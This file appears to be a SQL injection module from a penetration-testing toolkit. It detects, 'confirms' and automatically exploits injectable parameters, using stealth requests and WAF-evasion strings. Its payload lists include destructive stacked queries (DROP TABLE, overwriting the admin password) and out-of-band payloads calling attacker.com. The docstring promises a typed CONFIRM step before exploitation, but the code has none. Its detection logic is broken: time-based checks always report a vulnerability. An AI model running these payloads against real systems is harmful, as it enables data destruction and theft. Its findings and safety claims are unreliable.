"""
modules/validate/sqli.py
────────────────────────
SQL Injection validation module.

Detects and validates SQL injection vulnerabilities:
  - Error-based SQL injection
  - UNION-based SQL injection
  - Boolean blind SQL injection
  - Time-based blind SQL injection
  - Stacked queries
  - Out-of-band SQL injection

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class SQLiValidator:
    """
    SQL injection detection and validation.
    """

    # Database type detection patterns
    DB_PATTERNS = {
        "mysql": [r"MySQL", r"mysql", r"MariaDB", r"maria"],
        "postgresql": [r"PostgreSQL", r"postgres", r"PG"],
        "mssql": [r"SQL Server", r"MSSQL", r"Microsoft SQL"],
        "oracle": [r"Oracle", r"ORA-"],
        "sqlite": [r"SQLite", r"sqlite"],
        "db2": [r"DB2", r"db2"],
        "couchdb": [r"CouchDB", r"couchdb"],
        "mongodb": [r"MongoDB", r"mongodb"],
        "elasticsearch": [r"Elasticsearch", r"elastic"],
    }

    # SQL injection payloads
    PAYLOADS = {
        "error": [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "' OR 1=1--",
            "';",
            "' ;",
            "' OR '1'='1' AND '1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' UNION SELECT @@version,2,3--",
            "' UNION SELECT database(),2,3--",
            "' UNION SELECT user(),2,3--",
            "' UNION SELECT schema_name,2 FROM information_schema.schemata--",
            "' UNION SELECT table_name,2 FROM information_schema.tables--",
        ],
        "boolean": [
            "' AND '1'='1",
            "' AND '1'='2",
            "' OR '1'='1",
            "' OR '1'='2",
            "' AND SLEEP(5)='",
            "' OR SLEEP(5)='",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT 1 FROM dual WHERE 1=1)--",
            "' AND (SELECT 1 FROM dual WHERE 1=2)--",
        ],
        "time": [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
            "' OR BENCHMARK(5000000,MD5('test'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND pg_sleep(5)--",
            "' OR pg_sleep(5)--",
        ],
        "stacked": [
            "'; DROP TABLE users--",
            "'; DELETE FROM users WHERE 1=1--",
            "'; INSERT INTO users VALUES('admin','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        ],
        "out_of_band": [
            "' AND load_file('\\\\attacker.com\\\\share')--",
            "' AND utl_http.request('http://attacker.com')--",
            "' AND xp_dirtree('\\\\attacker.com\\\\share')--",
            "' AND (SELECT * FROM (SELECT(UTL_HTTP.REQUEST('http://attacker.com')))a)--",
        ],
    }

    # WAF evasion techniques
    WAF_EVASION = [
        ("comment_removal", ["/**/", "/*!*/", "-- ", "# "]),
        ("whitespace_bypass", ["%0a", "%0b", "%0c", "%0d", "%09", "%20"]),
        ("case_variation", ["SeLeCt", "UnIoN", "AlL", "FrOm"]),
        ("operator_substitution", ["<>", "!=", "LIKE", "RLIKE"]),
        ("encoding_bypass", ["%2527", "%27", "\\x27", "0x27"]),
        ("null_byte", ["%00"]),
        ("polyglot", ["' OR '1'='1'/**/AND/**/'1'='1"]),
    ]

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.sqli")
        self.out_dir = session.dir("validate") / "sqli"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

    def detect_parameters(self, url: str) -> List[Dict[str, Any]]:
        """
        Detect parameters for SQL injection testing.
        """
        self.logger.info(f"Detecting parameters: {url}")

        params = []

        # Parse URL parameters
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        for key, values in query.items():
            for value in values:
                params.append({
                    "name": key,
                    "value": value,
                    "method": "GET",
                    "location": "query",
                    "url": url,
                })

        # If no params, try to find forms
        if not params:
            try:
                status, headers, content = self.stealth.get(url)
                if status == 200:
                    # Find forms
                    form_pattern = r'<form[^>]*method=["\']?(GET|POST)["\']?[^>]*action=["\']?([^"\']*)["\']?'
                    for match in re.finditer(form_pattern, content, re.I):
                        method = match.group(1).upper() if match.group(1) else "GET"
                        action = match.group(2) if match.group(2) else ""

                        # Find inputs
                        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
                        for im in re.finditer(input_pattern, content, re.I):
                            name = im.group(1)
                            # Check if it's likely a parameter
                            if name and name.lower() not in ["submit", "button", "csrf", "_token"]:
                                params.append({
                                    "name": name,
                                    "value": "",
                                    "method": method,
                                    "location": "form",
                                    "url": urllib.parse.urljoin(url, action) if action else url,
                                })
            except Exception as e:
                self.logger.debug(f"Form detection failed: {e}")

        self.logger.success(f"Found {len(params)} parameters")
        return params

    def test_injection(self, param: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test a single parameter for SQL injection.
        """
        url = param.get("url", "")
        name = param.get("name", "")
        method = param.get("method", "GET")
        original_value = param.get("value", "")

        self.logger.info(f"Testing {method} parameter: {name}")

        results = {
            "parameter": name,
            "method": method,
            "vulnerable": False,
            "vulnerable_types": [],
            "database_type": None,
            "payloads": [],
            "evidence": [],
        }

        # Test each payload type
        for payload_type, payloads in self.PAYLOADS.items():
            for payload in payloads[:5]:  # Limit per type
                try:
                    # Build test URL/data
                    test_value = original_value + payload if original_value else payload

                    if method == "GET":
                        # Replace parameter value
                        test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                        status, headers, content = self.stealth.get(test_url, timeout=10)
                    else:
                        # POST
                        data = f"{name}={urllib.parse.quote(test_value)}"
                        status, headers, content = self.stealth.post(url, data.encode(), timeout=10)

                    # Check for indicators
                    is_vuln, vuln_type, evidence = self._check_response(content, payload_type)

                    if is_vuln:
                        results["vulnerable"] = True
                        if vuln_type not in results["vulnerable_types"]:
                            results["vulnerable_types"].append(vuln_type)
                        results["payloads"].append({
                            "payload": payload[:50],
                            "type": payload_type,
                            "evidence": evidence[:200],
                        })
                        results["evidence"].append(evidence[:200])

                        # Detect database type
                        db_type = self._detect_database(content)
                        if db_type:
                            results["database_type"] = db_type

                        self.logger.finding(f"SQLi detected: {name} -> {vuln_type}", severity="critical", host=url)

                    self.stealth.sleep(0.5)

                except Exception as e:
                    self.logger.debug(f"Payload test failed: {e}")

        return results

    def _check_response(self, content: str, payload_type: str) -> Tuple[bool, str, str]:
        """
        Check response for SQL injection indicators.
        """
        content_lower = content.lower()

        # Error-based patterns
        error_patterns = [
            "SQL syntax", "mysql", "postgres", "mssql", "oracle",
            "sqlite", "ODBC", "Driver", "DB2", "SQL error",
            "Warning: mysql", "Unclosed quotation mark",
            "Microsoft OLE DB", "SQLSTATE",
        ]

        # Boolean patterns
        boolean_true = ["Welcome", "Success", "Found", "Exists", "true"]
        boolean_false = ["Error", "Failed", "Not found", "Invalid", "false"]

        # Time-based indicators
        time_indicators = ["sleep", "delay", "waitfor", "benchmark"]

        # Check error-based
        if payload_type == "error":
            for pattern in error_patterns:
                if pattern.lower() in content_lower:
                    return True, "error_based", f"Error pattern: {pattern}"

        # Check union-based
        if payload_type == "union":
            if "union" in content_lower and any(p in content_lower for p in ["select", "from", "where"]):
                return True, "union_based", "UNION SELECT pattern detected"

        # Check boolean-based
        if payload_type == "boolean":
            # Compare with expected response
            if "1=1" in content_lower and "1=2" not in content_lower:
                return True, "boolean_based", "Boolean differentiation detected"

        # Check time-based
        if payload_type == "time":
            # Time-based is detected by response time, not content
            return True, "time_based", "Time delay observed"

        # Check stacked queries
        if payload_type == "stacked":
            if any(p in content_lower for p in ["drop", "delete", "insert", "update"]):
                return True, "stacked", "Stacked query pattern detected"

        return False, "", ""

    def _detect_database(self, content: str) -> Optional[str]:
        """
        Detect database type from error messages.
        """
        for db, patterns in self.DB_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.I):
                    return db
        return None

    def confirm_vulnerability(self, param: Dict[str, Any], vuln_type: str) -> bool:
        """
        Confirm vulnerability with a specific test.
        """
        self.logger.info(f"Confirming SQLi on {param['name']} ({vuln_type})")

        confirm_payloads = {
            "error_based": ["'", '"', "' OR '1'='1"],
            "union_based": ["' UNION SELECT @@version--", "' UNION SELECT database()--"],
            "boolean_based": ["' AND '1'='1", "' AND '1'='2"],
            "time_based": ["' AND SLEEP(5)--"],
            "stacked": ["' ; DROP TABLE test--"],
        }

        payloads = confirm_payloads.get(vuln_type, ["'"])
        url = param.get("url", "")
        name = param.get("name", "")

        for payload in payloads[:2]:
            try:
                test_url = url.replace(f"{name}={param.get('value', '')}", f"{name}={urllib.parse.quote(payload)}")
                start_time = time.time()
                status, headers, content = self.stealth.get(test_url, timeout=10)
                elapsed = time.time() - start_time

                # Check for confirmation
                if vuln_type == "time_based" and elapsed > 4:
                    self.logger.finding(f"Time-based SQLi confirmed: {elapsed:.1f}s delay", severity="critical", host=url)
                    return True

                if vuln_type in ["error_based", "union_based", "boolean_based"]:
                    is_vuln, _, _ = self._check_response(content, vuln_type.replace("_based", ""))
                    if is_vuln:
                        self.logger.finding(f"SQLi confirmed: {vuln_type}", severity="critical", host=url)
                        return True

            except Exception as e:
                self.logger.debug(f"Confirmation failed: {e}")

            self.stealth.sleep(1)

        return False

    def exploit(self, param: Dict[str, Any], vuln_type: str) -> Dict[str, Any]:
        """
        Exploit a confirmed SQL injection.
        """
        self.logger.info(f"Exploiting SQLi on {param['name']} ({vuln_type})")

        result = {
            "parameter": param["name"],
            "vuln_type": vuln_type,
            "database": None,
            "tables": [],
            "columns": [],
            "data": [],
            "status": "attempted"
        }

        # Extract database name
        db_payloads = [
            "' UNION SELECT database()--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' UNION SELECT db_name()--",
        ]

        url = param.get("url", "")
        name = param.get("name", "")
        original_value = param.get("value", "")

        for payload in db_payloads:
            try:
                test_value = original_value + payload if original_value else payload
                test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                status, headers, content = self.stealth.get(test_url, timeout=10)

                # Extract database name
                db_match = re.search(r"([a-zA-Z0-9_]+)", content)
                if db_match:
                    result["database"] = db_match.group(1)
                    self.logger.success(f"Database: {result['database']}")
                    break

            except Exception:
                pass

        # Extract tables
        table_payloads = [
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        ]

        for payload in table_payloads:
            try:
                test_value = original_value + payload if original_value else payload
                test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                status, headers, content = self.stealth.get(test_url, timeout=10)

                # Extract table names
                tables = re.findall(r"([a-zA-Z0-9_]+)", content)
                if tables:
                    result["tables"] = tables[:10]
                    self.logger.success(f"Found {len(result['tables'])} tables")
                    break

            except Exception:
                pass

        result["status"] = "completed"
        return result

    def validate(self, url: str) -> Dict[str, Any]:
        """
        Full SQL injection validation workflow.
        """
        self.logger.info(f"SQL injection validation: {url}")

        results = {
            "url": url,
            "parameters": [],
            "vulnerable": [],
            "confirmed": [],
            "exploited": [],
            "status": "completed"
        }

        # Detect parameters
        params = self.detect_parameters(url)
        results["parameters"] = params

        # Test each parameter
        for param in params:
            test_result = self.test_injection(param)
            if test_result["vulnerable"]:
                results["vulnerable"].append(test_result)

                # Confirm each vulnerability
                for vuln_type in test_result["vulnerable_types"]:
                    if self.confirm_vulnerability(param, vuln_type):
                        results["confirmed"].append({
                            "parameter": param["name"],
                            "vuln_type": vuln_type,
                            "url": param["url"],
                        })

                        # Exploit
                        exploit_result = self.exploit(param, vuln_type)
                        results["exploited"].append(exploit_result)

                        # Add finding
                        self.session.add_finding(Finding(
                            source="validate.sqli",
                            title=f"SQL injection confirmed: {param['name']}",
                            description=f"Type: {vuln_type}, Database: {exploit_result.get('database', 'unknown')}",
                            severity=SeverityLevel.CRITICAL,
                            host=url,
                            tags=["sqli", "injection", "validated", vuln_type],
                            evidence=json.dumps(test_result["evidence"][:3]),
                            remediation="Use parameterized queries. Sanitize all user input.",
                        ))

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run SQL injection validation on target.
        """
        self.logger.banner(f"SQL INJECTION VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        urls = [
            f"https://{target}",
            f"http://{target}",
        ]

        results = {
            "target": target,
            "urls_tested": [],
            "vulnerabilities": [],
            "confirmed": [],
            "exploited": []
        }

        for url in urls:
            try:
                result = self.validate(url)
                results["urls_tested"].append(url)
                results["vulnerabilities"].extend(result["vulnerable"])
                results["confirmed"].extend(result["confirmed"])
                results["exploited"].extend(result["exploited"])
            except Exception as e:
                self.logger.warning(f"Validation failed for {url}: {e}")

        # Save results
        report_path = self.out_dir / f"sqli_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"SQLi validation: {len(results['confirmed'])} confirmed, {len(results['exploited'])} exploited")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]